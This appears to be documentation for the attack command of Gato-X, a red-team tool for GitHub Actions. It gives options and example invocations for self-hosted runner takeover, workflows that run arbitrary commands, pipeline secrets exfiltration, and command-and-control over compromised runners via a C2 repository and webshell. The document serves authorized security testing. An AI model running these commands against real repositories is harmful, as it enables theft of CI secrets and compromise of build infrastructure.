# Attack Command

The attack command provides capabilities to exploit vulnerabilities in GitHub Actions workflows. This includes self-hosted runner takeover using the Runner-on-Runner (RoR) technique, workflow injection attacks, and secrets exfiltration.

> **Warning**: These features should only be used with proper authorization and for ethical security research purposes.

## Basic Usage

```bash
gato-x attack [options]
# or
gato-x a [options]
```

## Options

### General Options

| Option | Description |
|--------|-------------|
| `--target`, `-t` | Repository to target in attack (ORG/REPO format) |
| `--author-name`, `-a` | Name of the author for git commits |
| `--author-email`, `-e` | Email for git commits |
| `--branch`, `-b` | Target branch for the attack |
| `--message`, `-m` | Commit message to use |
| `--timeout`, `-to` | Timeout in seconds to wait for workflow execution |

### Attack Mode Options

| Option | Description |
|--------|-------------|
| `--workflow`, `-w` | Attack by pushing a workflow to a feature branch |
| `--runner-on-runner`, `-pr` | Attack with Runner-on-Runner via a Fork Pull Request |
| `--secrets`, `-sc` | Attack to exfiltrate pipeline secrets |
| `--interact` | Connect to a C2 repository and interact with connected runners |
| `--payload-only` | Generate payloads for manually deploying runner on runner |

### Workflow Attack Options

| Option | Description |
|--------|-------------|
| `--command`, `-c` | Command to execute as part of payload |
| `--name`, `-n` | Name of the workflow |
| `--file-name`, `-fn` | Name of yaml file without extension |
| `--custom-file`, `-f` | Path to a yaml workflow to upload |
| `--delete-run`, `-d` | Delete the resulting workflow run |

### Runner-on-Runner Options

| Option | Description |
|--------|-------------|
| `--source-branch`, `-sb` | Name of the PR source branch |
| `--pr-title`, `-pt` | Name of the PR that will be created |
| `--target-os` | Operating system for Runner-on-Runner attack (windows, linux, osx) |
| `--target-arch` | Architecture for Runner-on-Runner attack (arm, arm64, x64) |
| `--labels` | List of labels to request for self-hosted runner attacks |
| `--keep-alive` | Keep the workflow running after deploying a RoR |
| `--c2-repo` | Name of an existing Gato-X C2 repository in Owner/Repo format |

## Examples

### Perform Self-Hosted Runner Takeover

```bash
gato-x a --runner-on-runner --target MyOrg/MyRepo --target-os linux --target-arch x64
```

### Push a Workflow to Execute a Command

```bash
gato-x a --workflow --target MyOrg/MyRepo --command "whoami"
```

### Exfiltrate Secrets

```bash
gato-x a --secrets --target MyOrg/MyRepo
```

### Generate Runner-on-Runner Payload Only

```bash
gato-x a --payload-only --target-os linux --target-arch x64
```

### Interact with an Existing C2 Repository

```bash
gato-x a --interact --c2-repo MyOrg/C2Repo
```

## Runner-on-Runner Attack Process

When executing a Runner-on-Runner attack, Gato-X performs the following steps:

1. Prepare a C2 repository for command and control
2. Prepare payload Gist files
3. Deploy the RoR implantation payload
4. Confirm successful callback and runner installation
5. Provide an interactive webshell upon successful connection

## Security Considerations

- Always ensure you have proper authorization before using attack features
- Use these features only for ethical security research
- Follow responsible disclosure practices when finding vulnerabilities
